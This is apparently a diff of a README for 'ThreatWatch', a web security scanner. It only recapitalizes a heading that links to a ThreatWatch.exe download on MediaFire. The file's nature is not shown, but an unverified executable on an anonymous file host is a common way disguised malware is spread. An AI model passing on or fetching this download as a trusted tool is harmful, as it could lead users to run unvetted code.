@@ -22,4 +22,4 @@ ThreatWatch is the next-generation web security scanner designed to empower user
 
 ThreatWatch is your trusted ally in identifying and addressing vulnerabilities, safeguarding sensitive data, and enhancing web security effortlessly. Whether you're a seasoned developer or new to cybersecurity, ThreatWatch provides the tools you need to protect your digital world.
 
-# You can get the latest release of ThreatWatch [**here**](https://www.mediafire.com/file/m2b8sb8gx7h6idu/ThreatWatch.exe/file).
+# You Can Get The Latest Release of ThreatWatch [**Here**](https://www.mediafire.com/file/m2b8sb8gx7h6idu/ThreatWatch.exe/file).
